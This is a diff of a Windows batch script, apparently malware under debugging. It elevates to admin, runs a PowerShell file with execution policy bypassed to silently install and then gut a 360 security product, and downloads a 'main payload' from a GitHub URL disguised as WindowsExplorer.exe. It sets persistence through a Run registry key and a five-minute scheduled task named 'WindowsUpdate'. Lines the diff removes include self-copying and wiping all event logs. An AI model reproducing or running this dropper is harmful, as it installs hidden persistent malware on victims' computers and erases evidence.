@@ -1,37 +1,43 @@
 @echo off
+echo [1] checking privileges...
 net session >nul 2>&1
 if %errorLevel% neq 0 (
+    echo [!] Requesting Admin...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: 1. إنشاء ملف الباور شيل المؤقت (بدون مشاكل الرموز)
+echo [2] Creating setup.ps1...
 (
+echo Write-Host "[PS] Starting Setup..."
 echo $installerPath = "$env:TEMP\360.exe"
 echo $url = "https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe"
+echo Write-Host "[PS] Downloading from $url"
 echo try {
 echo     (New-Object System.Net.WebClient).DownloadFile($url, $installerPath)
+echo     Write-Host "[PS] Download Complete. Installing..."
 echo     Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
+echo     Write-Host "[PS] Waiting 45 seconds..."
 echo     Start-Sleep -Seconds 45
-echo     Stop-Process -Name "360*" -Force -ErrorAction SilentlyContinue
+echo     Write-Host "[PS] Cleaning up..."
+echo     Stop-Process -Name "360tray" -Force -ErrorAction SilentlyContinue
 echo     Remove-Item -Path "C:\Program Files (x86)\360" -Recurse -Force -ErrorAction SilentlyContinue
 echo     Remove-Item -Path $installerPath -Force
-echo } catch { Write-Host "Error occurred" }
+echo     Write-Host "[PS] Cleanup Finished."
+echo } catch { Write-Host "[!] Error: $_" }
 ) > "%temp%\setup.ps1"
 
-:: 2. تنفيذ الملف
+echo [3] Executing Setup (Watch the window)...
+:: إزالة -WindowStyle Hidden لنرى الأخطاء
 powershell -ExecutionPolicy Bypass -File "%temp%\setup.ps1"
-del "%temp%\setup.ps1"
 
-:: 3. باقي المهام (هنا نستخدم CMD مباشرة لتجنب أخطاء الباور شيل)
-mkdir "%systemdrive%\programdata\GG-Win" 2>nul
+echo [4] Downloading main payload...
 bitsadmin /transfer job1 /download /priority normal https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe "%programdata%\GG-Win\WindowsExplorer.exe"
+if %errorLevel% neq 0 echo [!] Bitsadmin failed!
 
+echo [5] Setting up persistence...
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe" /f
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
-start "" "%programdata%\GG-Win\WindowsExplorer.exe"
 
-copy "%~f0" "%ProgramData%\GG-Win\WindowsExplorer.bat" /Y
-schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
-
-for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1" 2>nul
+echo [6] Done. Press any key to close.
+pause
